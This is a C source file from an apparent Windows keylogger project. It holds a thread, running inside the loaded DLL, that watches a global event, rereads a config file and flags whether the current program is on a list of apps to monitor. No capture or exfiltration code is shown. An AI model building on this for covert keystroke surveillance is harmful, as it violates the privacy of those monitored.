//* Running in ReadConfigFile Thread.

#include "..\..\..\Include\Keylog.h"

HANDLE					hConfigChangeEvent;

extern	KLPROCESSDATA	TempProcessData;
extern	BOOL			fInitDone;
extern	BOOL			fMonitorApp;
extern	WCHAR			wszConfigFilePath[MAX_PATH + 1];
extern	BOOL			bKLExitReadConfigThread;
extern WCHAR g_szCurApp[];

#pragma data_seg( "SharedSegment" )
extern	BOOL		bKLExitAllReadConfigThread;
#pragma data_seg()
#pragma comment ( linker, "/SECTION:SharedSegment,RWS" )

DWORD WINAPI ReadNewKLConfiguration(LPVOID lpParam)
{
    hConfigChangeEvent = CreateEvent(NULL, TRUE, FALSE, L"Global\\KLConfigUpdate");
    if (hConfigChangeEvent == NULL)
    {
        return GetLastError();
    }

    HMODULE hMod = NULL;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCWSTR)ReadNewKLConfiguration, &hMod))
    {
        return GetLastError();
    }

    WCHAR szMsg[MAX_PATH];
    swprintf_s(szMsg, L"ReadNewKLConfiguration running in %s, threadID %u\n", g_szCurApp, GetCurrentThreadId());
    OutputDebugString(szMsg);

    while (bKLExitAllReadConfigThread != TRUE &&  bKLExitReadConfigThread != TRUE) {
        DWORD dwWait = WaitForSingleObject(hConfigChangeEvent, 1000);
        if (bKLExitAllReadConfigThread != TRUE &&  bKLExitReadConfigThread != TRUE && dwWait == WAIT_OBJECT_0) {
            BOOL funcRetVal = ConfigureAppFilter(); // TODO handle error return
            ResetEvent(hConfigChangeEvent);
        }
    }
    swprintf_s(szMsg, L"ReadNewKLConfiguration exiting from %s, threadID %u, %d, %d\n", g_szCurApp, GetCurrentThreadId(),
        bKLExitAllReadConfigThread, bKLExitReadConfigThread);
    OutputDebugString(szMsg);

    (void)CloseHandle(hConfigChangeEvent);
    FreeLibraryAndExitThread(hMod, ERROR_SUCCESS);
    return ERROR_SUCCESS; // unreachable code
}

BOOL ConfigureAppFilter()
{
    int Index = 0;
    int iRetVal = 0;;

    KLCONFIG KLConfig;

    FILE *fpConfig = NULL;
    errno_t iError;

    __try {
        // reset flags
        fInitDone = FALSE;
        fMonitorApp = FALSE;

        iError = _wfopen_s(&fpConfig, wszConfigFilePath, L"rb");
        if (iError != 0)
            return FALSE;

        fread(&KLConfig, sizeof(KLCONFIG), 1, fpConfig);		// handle this func..

        for (Index = 0; Index < KLConfig.nApps; Index++) {
            iRetVal = _wcsicmp(TempProcessData.wszEXEName, KLConfig.AppList[Index]);
            if (iRetVal != 0)
                continue;

            fMonitorApp = TRUE;
            break;
        }
        if (fInitDone != TRUE)
            fInitDone = TRUE;
        return TRUE;
    }

    __finally {
        if (fpConfig != NULL)
            fclose(fpConfig);
    }
}
